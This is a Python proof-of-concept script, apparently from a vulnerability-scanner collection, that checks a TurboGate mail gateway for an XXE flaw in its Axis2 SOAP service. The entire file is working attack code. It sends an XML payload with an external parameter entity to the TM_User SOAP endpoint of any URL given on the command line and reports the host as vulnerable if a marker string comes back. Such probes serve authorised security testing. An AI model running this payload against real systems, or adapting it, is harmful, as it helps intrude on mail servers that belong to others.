#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: TurboGate邮件网关XXE漏洞
referer: http://www.wooyun.org/bugs/wooyun-2016-0181424
author: Lucifer
description: TurboGate其实相当于TurboMail的早期版本，TurboGate集成了大量的在TurboMail中出现的漏洞。
        在TurboGate中使用的是axis2<=1.5.1版本，存在XXE漏洞，在利用的时候需要将Content-Type设置为application/xml。
'''
import sys
import json
import requests
import warnings
from termcolor import cprint

class turbogate_services_xxe_BaseVerify():
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
            "SOAPAction":"",
            "Content-Type":"application/xml"
        }
        post_data = '''<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "81dc9bdb52d04dc20036dbd8313ed055">%remote;]>'''
        vulnurl = self.url + "/services/TM_User.TM_UserHttpSoap11Endpoint"
        try:
            req = requests.post(vulnurl, headers=headers, data=post_data, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                cprint("[+]存在TurboGate邮件网关XXE漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+post_data+"\npost: "+json.dumps(post_data, indent=4), "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = turbogate_services_xxe_BaseVerify(sys.argv[1])
    testVuln.run()